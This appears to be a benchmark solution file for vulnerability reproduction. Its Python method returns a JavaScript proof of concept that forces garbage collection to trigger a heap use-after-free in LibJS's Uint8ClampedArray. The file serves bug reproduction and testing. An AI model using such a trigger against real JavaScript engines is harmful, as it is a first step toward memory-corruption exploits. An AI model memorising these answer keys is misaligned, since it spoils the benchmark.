class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a Heap-Use-After-Free in LibJS's implementation
        # of Uint8ClampedArray. The class did not inherit from TypedArray, causing
        # it to have incorrect Garbage Collection behavior. The GC would not trace
        # the reference to the internal ArrayBuffer that backs the instance.
        #
        # This PoC exploits this by:
        # 1. Allocating a Uint8ClampedArray.
        # 2. Forcing a GC cycle by creating allocation pressure.
        # 3. The internal ArrayBuffer of the victim is freed by the GC.
        # 4. Accessing the array after the GC causes a write to freed memory,
        #    triggering a Heap-Use-After-Free, which is detected by ASan.
        # An IIFE (Immediately Invoked Function Expression) is used to avoid
        # polluting the global scope, which is good practice for PoCs.

        poc_js = """
(function() {
    // PoC for arvo:34584: Uint8ClampedArray GC Use-After-Free

    // 1. Allocate the victim object.
    // Its internal buffer will be prematurely freed by the garbage collector
    // due to the bug. A page-sized allocation is a common choice.
    let victim = new Uint8ClampedArray(4096);

    // 2. Create allocation pressure to trigger a garbage collection cycle.
    // LibJS uses a simple mark-and-sweep collector triggered by heap usage.
    // Allocating several megabytes of temporary objects is a reliable way
    // to force a collection.
    for (let i = 0; i < 2000; i++) {
        new Array(512);
    }

    // 3. Trigger the Use-After-Free.
    // At this point, the GC has likely run and freed the buffer backing `victim`.
    // The following access writes to deallocated memory. With AddressSanitizer,
    // this will be detected, and the program will crash as required.
    victim[0] = 0xDE;
    victim[4095] = 0xAD;
})();
"""

        return poc_js.encode('utf-8')
